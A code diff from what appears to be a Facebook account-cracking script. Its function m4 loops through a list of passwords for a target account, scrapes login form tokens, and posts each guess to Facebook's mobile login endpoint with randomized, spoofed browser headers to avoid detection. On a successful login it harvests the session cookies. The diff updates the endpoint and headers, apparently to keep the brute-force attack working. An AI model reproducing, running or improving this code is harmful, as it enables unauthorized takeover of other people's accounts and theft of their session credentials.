@@ -1288,33 +1288,49 @@ def m4(ids,pwv):
     ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
     try:
         for pas in pwv:
-            free_fb = session.get('https://m.facebook.com/?locale2=en_GB').text
-            info={'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),'try_number': '0','unrecognized_tries': '0','email': ids,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '','had_cp_prefilled': 'false','had_password_prefilled': 'false','is_smart_lock': 'true','bi_xrwh': '0','pass': pas,'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),'__dyn': '','__csr': '','__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']),'__a': '','__user': '0','_fb_noscript': 'true'}
+            free_fb = session.get('https://free.facebook.com').text
+            info={
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': ids,
+            'pass': pas,
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '0'}
             update={
-            'Authority': 'm.facebook.com',
-            'Accept': '*/*',
-            'Accept-Language': 'es-MX,es;q=0.9',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'DPR': '2.75',
-            'Origin': 'https://m.facebook.com',
-            'Referer': 'https://m.facebook.com/?locale2=en_GB',
-            'Sec-CH-Prefers-Color-Scheme': 'light',
-            'Sec-CH-UA': '"Chromium";v="116", "Google Chrome";v="118", "Not=A?Brand";v="71"',
-            'Sec-CH-UA-Full-Version-List': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-            'Sec-CH-UA-Mobile': '?1',
-            'Sec-CH-UA-Model': '"23128PC33I"',
-            'Sec-CH-UA-Platform': 'Android',
-            'Sec-CH-UA-Platform-Version': '"8.0.0"',
-            'Sec-Fetch-Dest': 'empty',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Site': 'same-origin',
-            'User-Agent': 'viabrowser;Safary-Mozilla/5.0 (Windows NT 10.0 .1; WOW64)LDK2WU)Applewebkit/537.36 (KHTML, like Gecko) Chrome/140.0.4699.170 Safari/537.36 Vivaldi/6.0.2979.18',
-            'Viewport-Width': '393',
-            'X-ASBD-ID': '129477',
-            'X-FB-LSD': 'AVq9MsDYu_k',
-            'X-Requested-With': 'XMLHttpRequest',
-            'X-Response-Format': 'JSONStream'}
-            session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=en_GB&refid=8',data=info,headers=update).text
+            'Host': 'm.facebook.com',
+            'content-length': str(rr(2000, 2999)),
+            'sec-ch-ua': '"Not.A/Brand";v="18", "Chromium";v="112", "Google Chrome";v="110"',
+            'sec-ch-ua-mobile': '?1',
+            'user-agent': 'Mozilla/5.0 (Symbian/3; Series60/2.5 Nokia9258/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/5.3.3.1 Mobile Safari/535.1',
+            'viewport-width': str(rr(400, 989)),
+            'content-type': 'application/x-www-form-urlencoded',
+            'x-fb-lsd': 'AVr3lkj6xU0',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'x-asbd-id': '129477',
+            'x-requested-with': 'com.android.chrome',
+            'sec-ch-ua-full-version-list': '"Not.A/Brand";v="9.0.0.0", "Chromium";v="113.0.4267.237", "Google Chrome";v="111.0.5252.246"',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua-platform': '"Android"',
+            'accept': '*/*',
+            'origin': 'https://m.facebook.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://m.facebook.com/',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'fr_FR,fr;q=0.9'}
+            session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
